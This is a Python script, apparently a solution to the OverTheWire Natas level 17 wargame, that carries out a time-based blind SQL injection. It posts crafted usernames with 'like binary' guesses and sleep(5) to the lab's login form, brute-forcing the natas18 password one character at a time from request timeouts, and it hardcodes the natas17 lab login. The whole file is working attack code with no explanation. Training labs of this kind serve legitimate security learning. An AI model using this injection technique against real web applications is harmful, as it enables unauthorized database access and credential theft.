#a true sql injection
import requests
from string import ascii_letters, digits


url='http://natas17.natas.labs.overthewire.org/'
auth=('natas17','8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
s=requests.Session()
nxt=ascii_letters+digits
pswd=""
while True:
    for c in nxt:
        print(f'pswd: {pswd}; trying: {c}')
        try:
            trial = f'natas18" and password like binary "{pswd + c}%" and sleep(5);#'
            resp=s.post(url,auth=auth, data={"username":trial}, timeout=1)
        except requests.Timeout:
            pswd+=c
#            print(len(pswd))#progress bar
            if len(pswd)==32:
                print(pswd)#knew this because i tried a and length(password)=32;# which exists
                exit(0)
            else:
                break